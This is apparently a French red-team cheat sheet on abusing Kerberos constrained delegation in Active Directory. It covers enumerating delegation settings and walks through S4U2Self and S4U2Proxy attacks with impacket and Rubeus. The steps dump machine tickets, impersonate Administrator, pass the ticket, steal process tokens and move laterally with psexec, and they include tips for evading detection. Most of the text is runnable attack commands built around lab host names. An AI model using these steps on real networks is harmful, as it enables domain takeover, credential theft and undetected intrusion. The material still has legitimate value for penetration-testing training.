
> [!TIP]
> 
> Dans le cas d'un service classique, n'importe qui accédant au service va utiliser un ST qui sera stocké en mémoire sur la machine cible. Dans le cas d'une délégation contrainte, la machine cible va marquer le ST de l'utilisateur comme FORWARDABLE et pourra s'en servir pour obtenir un ST sur une autre service défini auprès du KDC. C'est le serveur Front end qui est autorisé à déléguer à un serveur backend.
> - Définit avec l'attribut msDS-AllowedToDelegateTo


- [[#S4U]]
	- [[#Identifier]]
	- [[#Service Name Substitution]]
	- [[#Attack S4U]]


# S4U

- S4U2Proxy -> Permet au service d'obtenir un ST au nom d'un autre user et de l'usurper pour accéder à un autre service.
- S4U2Self (Protocol Transition) -> Permet au service d'obtenir un ST au nom d'un autre user et de l'usurper pour accéder à lui même. Utilisé dans le cas ou un autre protocole que Kerberos est utilisé, permet ensuite de faire un S4U2Proxy afin d'accéder à un autre service.


## Identifier

1. Identifier les délégations contraintes

```
ldapsearch (msDS-AllowedToDelegateTo=*) --attributes samAccountName,msDS-AllowedToDelegateTo
```

2. Identifier la valeur de l'UAC sur le compte

```
ldapsearch (samaccountname=lon-ws-1$) --attributes userAccountControl
```

3. Identifier si la transition de protocole est activée (S4U2self) (UAC = 16777216 [property flags](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties)) (Compare la valeur de l'UAC à celle de la transition de protocole -> Actif si retourne True)

```powershell
[System.Convert]::ToBoolean(<UAC_value> -band 16777216)
```


## Service Name Substitution

> [!Attention]
> Possible de substituer le nom du service avec un autre nom de service.
> Par exemple TIME/PC1 -> CIFS/PC1. Cela nous permet de latéraliser avec un service pas forcement exploitable de base. 
> Pas possible de demander un TGS pour un autre service (PC1 doit rester PC1)
> Exploitable avec /altservice: -> nouveau service, accepte une liste séparé par des virgules (cifs,http,host -> génère 3 TGS)


## Attack S4U

> [!Tip]
> Necessite un beacon sur la machine et les privileges system 


### LINUX

### Avec transition de protocole

```sh
impacket-getST -spn "HTTP/winterfell.north.sevenkingdoms.local" -altservice "CIFS/winterfell.north.sevenkingdoms.local" -impersonate "Administrator" "north.sevenkingdoms.local"/"jon.snow":"iknownothing"
```


### WINDOWS

### Avec transition de protocole

Si transition de protocole activé, possible d'obtenir un TGT pour le compte d'ordinateur puis faire une requête S4U2self afin d'usurper n'importe quel utilisateur du domaine.

1. Afficher tous les tickets

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
```

2. Dump le TGT du compte de machine

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0xd42c80 /service:krbtgt /nowrap
```

3. Faire une requête S4U2self et usurper n'importe quel utilisateur du domaine à l'aide du TGT dumpé + substitution du nom de service (/altservice:cifs).

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:<computer-name$> /msdsspn:cifs/lon-fs-1 /altservice:cifs /ticket:<TGT_compte_machine> /impersonateuser:Administrator /nowrap
```

4. Pass The Ticket dans un nouveau process

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:<tgs>
```

5. Voler le token du process et l'ajouter au store

```
token-store steal <pid>
```

6. Utiliser le token (ne pas faire attention au user impersonné indiqué, il s'agit du username qui à lancé le process)

```
token-store use <id>
```

7. Vérifier que le TGS est présent en cache

```
run klist
```

8. Possible d'énumérer le partage ensuite ou bien latéraliser avec psexec

```
ls \\lon-fs-1\c$
```

Définir le processus à injecter et le nom du service pour réduire la surface de detection :

```
ak-settings service updater
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
```

```
jump psexec64 lon-fs-1 smb
```


### Sans transition de protocole

S4U2proxy -> Permet uniquement d'impersoner le user prévu à cet effet.

1. Afficher tous les tickets

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
```

2. Dump le TGT du compte de machine

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0xd42c80 /service:krbtgt /nowrap
```

3. Dump le TGS du compte usurpable

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0xd42c80 /service:HTTP/lon-ws-1 /nowrap
```

3. Faire une requête S4U2proxy pour générer un TGS avec le compte usurpable + substitution du nom de service (/altservice:cifs)..

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /altservice:cifs /ticket:<TGT_compte_machine> /tgs:<tgs_user_usurpable> /nowrap
```

4. Pass The Ticket dans un nouveau process

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:user /password:FakePass /ticket:<tgs>
```

5. Voler le token du process et l'ajouter au store

```
token-store steal <pid>
```

6. Utiliser le token (ne pas faire attention au user impersonné indiqué, il s'agit du username qui à lancé le process)

```
token-store use <id>
```

7. Vérifier que le ticket est présent en cache

```
run klist
```

8. Possible d'énumérer le partage ensuite ou bien latéraliser avec psexec

```
ls \\lon-fs-1\c$
```

Définir le processus à injecter et le nom du service pour réduire la surface de detection :

```
ak-settings service updater
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
```

```
jump psexec64 lon-fs-1 smb
```
